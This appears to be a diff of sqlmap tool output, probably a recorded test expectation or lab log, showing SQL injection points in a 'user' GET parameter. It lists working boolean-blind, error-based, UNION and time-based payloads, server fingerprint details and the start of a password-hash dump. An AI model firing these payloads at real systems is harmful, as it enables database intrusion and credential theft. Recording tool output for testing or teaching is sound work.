@@ -1,22 +1,26 @@
-sqlmap identified the following injection points with a total of 52 HTTP(s) requests:
+sqlmap identified the following injection points with a total of 34 HTTP(s) requests:
 ---
 Place: GET
 Parameter: user
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: user=root' AND 4196=4196 AND 'FwKW'='FwKW
+    Payload: user=root' AND 8380=8380 AND 'tDuM'='tDuM
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: user=root' AND (SELECT 2257 FROM(SELECT COUNT(*),CONCAT(0x7179637971,(SELECT (CASE WHEN (2257=2257) THEN 1 ELSE 0 END)),0x71647a7371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Nhxc'='Nhxc
 
     Type: UNION query
     Title: MySQL UNION query (NULL) - 16 columns
-    Payload: user=root' UNION ALL SELECT NULL,CONCAT(0x7173677471,0x4c4e4757786677676f66,0x716b636571),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+    Payload: user=root' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7179637971,0x7a494272497270586945,0x71647a7371),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
 
     Type: AND/OR time-based blind
     Title: MySQL > 5.0.11 AND time-based blind
-    Payload: user=root' AND SLEEP(5) AND 'DqOO'='DqOO
+    Payload: user=root' AND SLEEP(5) AND 'OHgI'='OHgI
 ---
 web server operating system: Linux Ubuntu 12.04 (Precise Pangolin)
 web application technology: Apache 2.2.22, PHP 5.3.10
-back-end DBMS: MySQL 5.0.11
+back-end DBMS: MySQL 5.0
 database management system users password hashes:
 [*] % [1]:
     password hash: NULL
